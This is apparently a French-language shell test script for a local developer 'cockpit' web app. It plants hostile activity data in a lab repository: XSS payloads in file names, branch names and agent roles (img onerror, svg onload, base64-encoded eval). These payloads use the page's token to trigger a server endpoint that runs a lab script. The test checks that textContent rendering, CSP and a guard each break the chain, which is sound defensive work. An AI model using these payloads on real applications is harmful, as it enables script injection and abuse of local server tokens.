# ============================== Volet ACTIVITÉ (Phase 75, ACTV-12) ==============================
# Les DONNÉES d'activité (nom de fichier, nom de branche, rôle et description d'agent) traversent la route /api/vf/activite, le canal de marques, la marque, l'infobulle, le nom accessible,
# le panneau, le compte du radar et la zone d'annonce. Même chaîne (script dans la page -> jeton -> POST /api/plan/undo -> script du lab), même faux moteur, mêmes mutants de CSP et de garde ;
# le maillon « échappement » est ici le rendu en textContent du canal de marques (M-TEXTE-ACT : innerHTML dans la copie de la sortie).
#   C0a témoin (M-TEXTE-ACT + M-CSP + M-GARDE) -> la chaîne ABOUTIT · C1a code livré : rien n'aboutit · C2a textContent seul · C3a CSP seule · C4a garde seule
# Sans navigateur le volet est SAUTÉ et compté comme tel (jamais réussi). Mutant étiqueté « Q1.2 » : l'innerHTML dans la marque rend X1 rouge (Q1.2 = C0a rouge sur le code livré muté).
if [ "${CHAINE_SEUL:-}" != "temoin" ]; then
echo "=== Volet activité — données d'activité hostiles : C0a à C4a ==="
if [ -z "$CHROME" ]; then skip "C0a à C4a (volet activité)" "pas de navigateur : une donnée d'activité ne se rend que dans une page"; else
GA() { git -c user.email=t@t.test -c user.name=t "$@"; }
PAYLOAD_JS_A="fetch('/api/plan/undo',{method:'POST',headers:{'x-vf-cockpit-token':VF_COCKPIT_SERVER.token}})"
ATOB_A="eval(atob('$(printf '%s' "$PAYLOAD_JS_A" | base64 | tr -d '\n')'))"
FICHIER_H="h<img src=x onerror=console.info(1)>.js";   # court : une cible de plus de 120 caractères est coupée par « … » et ne se joint plus à sa carte (P75-D-31) ; la charge qui s'exécute vit dans la branche, le rôle et le fichier prévu
 BRANCHE_A="<svg/onload=$ATOB_A>"; ROLE_A="<img src=x onerror=$ATOB_A>"; TITRE_A="<img src=x onerror=$ATOB_A> __proto__"
PREVU_H="src/p<img src=x onerror=$ATOB_A>.mjs"
LABX="$WORK/labx"; mkdir -p "$LABX/src" "$LABX/plugin/demo" "$LABX/.planning/phases/01-x" "$LABX/evil/scripts"
printf '{"name":"demo","version":"1.0.0"}\n' > "$LABX/plugin/demo/module.json"; printf '1.0.0\n' > "$LABX/plugin/demo/VERSION"
printf 'export const util = () => 1;\n' > "$LABX/src/util.js"; printf 'export const a = 1;\n' > "$LABX/src/$FICHIER_H"
printf 'export const p = 1;\n' > "$LABX/src/__proto__.js"; printf 'export const s = 1;\n' > "$LABX/src/x$(printf '\xe2\x80\xa8')y.js"
printf -- '- [ ] **Phase 1: Socle** - premier jet\n' > "$LABX/.planning/ROADMAP.md"
for n in 01 02; do printf -- '---\nphase: 1\nplan: "%s"\nwave: 1\nfiles_modified:\n  - %s\n---\n<objective>Faire le socle</objective>\n' "$n" "$PREVU_H" > "$LABX/.planning/phases/01-x/01-$n-PLAN.md"; done
for s in plan build; do printf "import fs from 'node:fs'; fs.writeFileSync(%s,'executé par le serveur');\n" "'$WORK/MARQUEUR-SCRIPT-DU-LAB'" > "$LABX/evil/scripts/$s.mjs"; done
GA -C "$LABX" init -q -b main; printf '.vibeflow\n' >> "$LABX/.git/info/exclude"; GA -C "$LABX" add -A; GA -C "$LABX" commit -q -m init
for k in 1 2 3; do printf '// r%s\n' "$k" >> "$LABX/src/$FICHIER_H"; printf '// r%s\n' "$k" >> "$LABX/src/__proto__.js"; GA -C "$LABX" commit -q -am "c$k"; done
node "$SCRIPTS/vf-cockpit-build.mjs" "$LABX" --quiet > "$WORK/build-x.out" 2>&1 || cat "$WORK/build-x.out"
cat > "$AUX/mkroute.mjs" <<'JS'
// mkroute.mjs <route.json> <fichier> <rôle> <description> : la vraie route du lab, à laquelle on ajoute une marque d'empreinte et une collision d'agents dont le rôle et la description sont hostiles
// (la frise d'un vrai agent demande l'état officiel de `claude agents --json` : la page reçoit donc ces tuples par la même forme de route, poussée par l'amorce de la page)
import fs from 'node:fs';
const [, , f, fichier, role, desc] = process.argv; const j = JSON.parse(fs.readFileSync(f, 'utf8'));
j.empreinte = { ...j.empreinte, etat: 'ok', incomplet: false, marques: [[fichier, 'en-cours', [role + ' · nœud ' + desc, desc + ' · non rattaché']]] };
j.collisions = [...(j.collisions || []), [fichier, 'agents', [role, desc], null]];
j.radar = { ...j.radar, total: (j.radar?.total || 0) + 1, incomplet: false, raisons: [] };
process.stdout.write(JSON.stringify(j));
JS
cat > "$AUX/activite.mjs" <<'JS'
// activite.mjs <chrome> <racine> : ouvre la page sous CSP, va sur le nœud qui porte le fichier hostile, choisit chaque lentille, relève le DOM
// rend { charges, lentilles: { <id>: { marques, noms, panneau, compte, annonce } }, violations }
import { pathToFileURL } from 'node:url';
const { executer, pause } = await import(pathToFileURL(process.env.CHROME_SESSION).href);
const [, , chrome, racine, routeJson] = process.argv;
const fs = await import('node:fs');
const PRET = "document.readyState === 'complete' && !!window.VibeFlow && !!window.VibeFlow.state && !!window.VibeFlow.state.layout && document.documentElement.dataset.vfPret === 'oui'";
const SANS_VISITE = "(() => { const g = Storage.prototype.getItem; Storage.prototype.getItem = function (k) { const v = typeof k === 'string' && (k.indexOf('floorplan:tour-seen:') === 0 || k.indexOf('vibeflow-cockpit:visite:') === 0); return v ? 'true' : g.call(this, k); }; })()";
const CHARGES = "document.querySelectorAll('[onerror], [onload], [onfocus], img[src=x], svg[onload]').length";
await executer(chrome, async (s) => {
  const STUB = `(() => { const d = ${fs.readFileSync(routeJson, 'utf8')}; const f0 = window.fetch; window.fetch = function (u, o) { return String(u).includes('/api/vf/activite') ? Promise.resolve(new Response(JSON.stringify(d), { status: 200, headers: { 'content-type': 'application/json' } })) : f0.apply(this, arguments); }; })()`;
  await s.send('Page.addScriptToEvaluateOnNewDocument', { source: SANS_VISITE + ';' + STUB });
  await s.send('Emulation.setDeviceMetricsOverride', { width: 1440, height: 900, deviceScaleFactor: 1, mobile: false });
  await s.naviguer(racine + '/index.html?lang=fr'); await s.attendre(PRET, 'page prête');
  await s.ev("(() => { const t = document.querySelector('#tour'); if (t && !t.hidden) document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' })); })()");
  await s.attendre("!!document.getElementById('btn-lentilles')", 'sélecteur posé'); await pause(1500);
  const aller = async (id) => { await s.ev(`VibeFlow.go(${JSON.stringify(id)})`); try { await s.attendre(`VibeFlow.state.container === ${JSON.stringify(id)} && !!document.querySelector('#viewport .node')`, `vue ${id}`, 8000); } catch { return false; } await pause(600); return true; };
  const cles = () => s.ev("JSON.stringify([...VibeFlow.state.chipEls.keys()])").then(JSON.parse);
  let trouve = null;
  for (const n of (await cles()).filter((k) => k.startsWith('n:')).sort((a, b) => (a === 'n:unassigned' ? -1 : b === 'n:unassigned' ? 1 : 0))) {
    if (!(await aller(n))) continue; const c = await cles();
    if (c.some((k) => k.startsWith('f:') && /onerror/.test(k))) { trouve = c.find((k) => k.startsWith('f:') && /onerror/.test(k)); break; }
    const d = c.filter((k) => k.startsWith('d:'));
    for (const x of d) { if (!(await aller(x))) continue; const cc = await cles(); const f = cc.find((k) => k.startsWith('f:') && /onerror/.test(k)); if (f) { trouve = f; break; } }
    if (trouve) break;
  }
  const lentilles = {};
  if (trouve) for (const id of ['chauds', 'empreinte', 'gardes']) {
    await s.ev("(() => { const m = document.getElementById('lens-menu'); if (!m.classList.contains('open')) document.getElementById('btn-lentilles').click(); })()"); await pause(150);
    await s.ev(`document.querySelector('#lens-menu .lr[data-id="${id}"]').click()`); await pause(900);
    await s.ev(`VibeFlow.select(${JSON.stringify(trouve)})`); await pause(700);
    lentilles[id] = await s.ev(`(() => { const g = VibeFlow.state.chipEls.get(${JSON.stringify(trouve)}); const lm = g ? [...g.querySelectorAll('.lm')] : [];
      return { marques: lm.map((x) => [x.textContent, x.getAttribute('title') || '']), nom: g ? g.getAttribute('aria-label') : null, panneau: document.getElementById('panel').textContent,
        compte: [...document.querySelectorAll('.vfa-compte')].map((x) => x.textContent + '|' + (x.title || '')), annonce: (document.getElementById('ask-live') || {}).textContent || '', charges: ${CHARGES} }; })()`);
    await s.ev('VibeFlow.select(null)');
  }
  return { trouve: !!trouve, charges: await s.ev(CHARGES), lentilles, violations: [...s.violations] };
}, { csp: true });
JS
# manche_a <étiquette> <mutants…> : copie du lab, agents, module muté, serveur, page, effets
manche_a() {
  local label="$1"; shift
  local L="$WORK/labx-$label"; rm -rf "$L"; cp -R "$LABX" "$L"; local o="$L/.vibeflow/cockpit"
  MUT_OUT="$o"; rm -rf "$WORK/mod-a-$label"; MUT_MOD="$(cockpit_module_copie "$WORK/mod-a-$label")" || { R_CHARGES="copie-du-module-impossible"; return; }
  mkdir -p "$o/.cache/history/a"; printf '{"dir":"%s"}\n' "$LABX/evil" > "$o/.cache/skill.json"; printf '{}\n' > "$o/.cache/history/a/plan.json"; rm -f "$o/.cache/server.json"
  local i=0 b wt   # deux worktrees vérifiés dont les branches modifient le même fichier : la collision « branches » porte le nom hostile
  for b in "$BRANCHE_A" zz; do i=$((i+1)); wt="$WORK/wt-$label-$i"; rm -rf "$wt"; GA -C "$L" worktree add -q -b "$b" "$wt" main && { printf '// %s\n' "$i" >> "$wt/src/$FICHIER_H"; GA -C "$wt" commit -q -am b; }; done
  local m; for m in "$@"; do mutant "$o" "$m" || { R_CHARGES="mutant-sans-effet"; return; }; done
  rm -f "$WORK/MARQUEUR-SCRIPT-DU-LAB"
  COCKPIT_MODULE="$MUT_MOD" COCKPIT_SORTIE="$o" COCKPIT_LOG="$WORK/serve-a-$label.out" cockpit_lancer "$L" VF_COCKPIT_ENGINE_DIR="$MUT_MOD/skills/cockpit-moteur" VF_COCKPIT_SCRIPTS_DIR="$MUT_MOD/scripts" || true
  local pid="$VF_PID" fin=$((SECONDS + 60))
  while [ "$SECONDS" -lt "$fin" ]; do   # la route lit git et la frise hors de la requête : on attend un état lu
    cockpit_get /api/vf/activite > "$WORK/route-a.json"
    [ "$(node -e "const j=JSON.parse(require('fs').readFileSync('$WORK/route-a.json','utf8'));console.log(j.git.etat==='ok'&&j.calcul==='pret'&&j.empreinte.etat==='ok'&&j.collisions.length>0)" 2>/dev/null)" = "true" ] && break; sleep 0.4
  done
  R_ROUTE="$(node -e "const j=JSON.parse(require('fs').readFileSync('$WORK/route-a.json','utf8'));const t=JSON.stringify(j);console.log([j.git.etat,j.collisions.length>0,/onerror=eval/.test(t),/svg\/onload=eval/.test(t)].join('|'))" 2>/dev/null || echo illisible)"
  node "$AUX/mkroute.mjs" "$WORK/route-a.json" "src/$FICHIER_H" "$ROLE_A" "$TITRE_A" > "$WORK/route-patch.json"
  local res; res="$(REAL_HOME="$REAL_HOME" node "$AUX/activite.mjs" "$CHROME" "http://127.0.0.1:$VF_PORT" "$WORK/route-patch.json")"
  local want=""; case "$label" in temoina) want=marq ;; esac
  fin=$((SECONDS + ${VF_CDP_ECHEANCE_S:-60}))
  while [ "$SECONDS" -lt "$fin" ]; do [ -z "$want" ] && break; [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && break; sleep 0.2; done
  sleep 1; vf_hyg_stop "$pid"
  R_RES="$res"; R_CHARGES="$(printf '%s' "$res" | jq_ 'j.charges')"; R_TROUVE="$(printf '%s' "$res" | jq_ 'j.trouve')"; R_VIOL="$(printf '%s' "$res" | jq_ '(j.violations||[]).length')"
  R_MARQUEUR=non; [ -f "$WORK/MARQUEUR-SCRIPT-DU-LAB" ] && R_MARQUEUR=oui
  echo "     [$label] mesure : route=$R_ROUTE trouvé=$R_TROUVE charge-dans-le-DOM=$R_CHARGES violations=$R_VIOL script-du-lab-exécuté=$R_MARQUEUR ${res:0:120}"
}
oui_non() { [ "${1:-0}" -ge 1 ] 2>/dev/null && echo oui || echo non; }

echo "=== C0a — témoin : rendu en innerHTML (M-TEXTE-ACT), CSP neutralisée (M-CSP), garde retirée (M-GARDE) : la chaîne doit ABOUTIR ==="
manche_a temoina M-TEXTE-ACT M-CSP M-GARDE
assert_eq "C0a.1 — le nom du fichier, le rôle ou la branche deviennent des éléments à gestionnaire d'événement dans la page" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C0a.2 — le script désigné par le lab a été exécuté par POST /api/plan/undo : le marqueur existe (sinon la chaîne d'activité est aveugle)" "$R_MARQUEUR" "oui"
echo "=== C1a — code livré : une donnée d'activité hostile n'aboutit nulle part ==="
manche_a livrea
assert_eq "C1a.0 — témoins de la VRAIE route : git lu, des collisions, le plan prévu et la branche hostiles servis tels quels (le lab n'est pas anodin)" "$R_ROUTE" "ok|true|true|true"
assert_eq "C1a.1 — aucun élément à gestionnaire dans la page, quelle que soit la lentille (textContent)" "$R_CHARGES|$(printf '%s' "$R_RES" | jq_ 'Object.values(j.lentilles).map((l) => l.charges).join(",")')" "0|0,0,0"
assert_eq "C1a.2 — aucun script du lab exécuté" "$R_MARQUEUR" "non"
assert_eq "C1a.3 — la page fonctionne sous la CSP (la carte du fichier est trouvée, 0 violation)" "$R_TROUVE|$R_VIOL" "true|0"
assert_eq "C1a.4 — le texte hostile apparaît LITTÉRALEMENT : le rôle dans la marque et son infobulle, le nom accessible de la carte (début du nom, coupé comme le moteur le coupe), le fichier et le rôle dans le panneau, le rôle et la branche dans le panneau" \
  "$(printf '%s' "$R_RES" | jq_ '(() => { const e = j.lentilles.empreinte, h = /onerror=eval\(atob\(/; const tous = Object.values(j.lentilles).map((l) => l.panneau).join(" ");
    return [e.marques.some((m) => h.test(m[0]) || h.test(m[1])), /<img/i.test(e.nom || ""), /onerror=console\.info\(1\)/.test(e.panneau) && h.test(e.panneau), /svg\/onload=eval/.test(tous)]; })()')" "[true,true,true,true]"
assert_eq "C1a.5 — le compte du radar et la zone d'annonce ne portent aucune balise (texte seul)" "$(printf '%s' "$R_RES" | jq_ 'Object.values(j.lentilles).every((l) => l.compte.every((c) => !/[<>]/.test(c)) && !/[<>]/.test(l.annonce))')" "true"
echo "=== C2a — textContent SEUL (CSP et garde retirées) ==="
manche_a texte M-CSP M-GARDE
assert_eq "C2a.1 — maillon rompu : 0 élément à gestionnaire dans la page" "$R_CHARGES" "0"
assert_eq "C2a.2 — aucun script du lab exécuté (la carte du fichier est pourtant trouvée)" "$R_MARQUEUR|$R_TROUVE" "non|true"
echo "=== C3a — CSP SEULE (rendu en innerHTML et garde retirés) : la balise existe, son code ne s'exécute pas ==="
manche_a cspa M-TEXTE-ACT M-GARDE
assert_eq "C3a.1 — témoin : la charge est bien dans la page (le rendu est en innerHTML)" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C3a.2 — maillon rompu : aucun script du lab exécuté (la CSP bloque le gestionnaire)" "$R_MARQUEUR" "non"
echo "=== C4a — garde .cache SEULE (rendu en innerHTML et CSP retirés) : le script part, mais celui du lab n'est PAS exécuté ==="
manche_a gardea M-TEXTE-ACT M-CSP
assert_eq "C4a.1 — témoin : la charge est dans la page (rendu en innerHTML, CSP retirée)" "$(oui_non "$R_CHARGES")" "oui"
assert_eq "C4a.2 — maillon rompu : le script désigné par le lab n'est PAS exécuté (le moteur ne lit plus .cache/skill.json)" "$R_MARQUEUR" "non"
echo "=== Q1.2 — mutant « innerHTML dans la marque » (CSP et garde livrées) : le volet doit le VOIR rouge ==="
manche_a mutantmarque M-TEXTE-ACT
assert_eq "Q1.2 — mutant « innerHTML dans la marque » : rouge (la charge entre dans la page : C1a.1 rougirait)" "$(oui_non "$R_CHARGES")|$R_MARQUEUR" "oui|non"
fi
fi

vf_hyg_assert
echo ""
echo "=================================="
echo "  Résultats : $PASS PASS / $FAIL FAIL / $SKIP SAUTÉ"
echo "=================================="
TOTAL=$((PASS+FAIL))
if [ "$TOTAL" -eq 0 ]; then echo "  ❌ ÉCHEC ANTI-VERT-À-VIDE — zéro assertion exécutée"; exit 1; fi
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
